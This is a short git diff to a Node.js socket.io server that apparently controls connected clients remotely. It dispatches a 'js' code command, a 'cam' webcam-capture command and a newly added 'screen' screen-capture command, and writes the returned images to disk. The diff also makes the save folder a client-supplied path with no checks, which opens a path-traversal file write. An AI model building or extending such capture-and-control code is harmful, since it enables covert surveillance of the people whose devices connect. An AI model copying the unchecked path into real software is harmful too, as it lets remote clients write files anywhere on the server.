@@ -4,10 +4,10 @@ const { Server } = require("socket.io");
 const { Konsole } = require('./Konsole.js')
 const colors = require('colors')
 const fs = require('fs')
-const showdown  = require('showdown')
+const showdown = require('showdown')
 const markdown = new showdown.Converter()
 
-let md = fs.readFileSync('./readme.md', {encoding:'utf8'})
+let md = fs.readFileSync('./readme.md', { encoding: 'utf8' })
 let html = `<body style='overflow:hidden;background: black; color: white;'>
     <div style='font-family: arial;padding:100px;width: 800px;'>${markdown.makeHtml(md)}</div>
   </body>`
@@ -34,8 +34,8 @@ io.on('connection', socket => {
     socket_id = socket.id
     konsole.socket = socket.id
   }
-  socket.on("image", (buffer) => {
-    fs.writeFileSync(`webcam/${socket.id}_${Date.now()}.png`, buffer)
+  socket.on("image", (buffer, path) => {
+    fs.writeFileSync(`${path}/${socket.id}_${Date.now()}.png`, buffer)
   })
   socket.on('response', message => {
     konsole.log(message)
@@ -125,6 +125,11 @@ commands.set('js', function(code) {
 
 commands.set('cam', function() {
   io.to(socket_id).emit('cam')
+  konsole.startCD(2)
+})
+
+commands.set('screen', function() {
+  io.to(socket_id).emit('screen')
   konsole.startCD(2)
 })
 
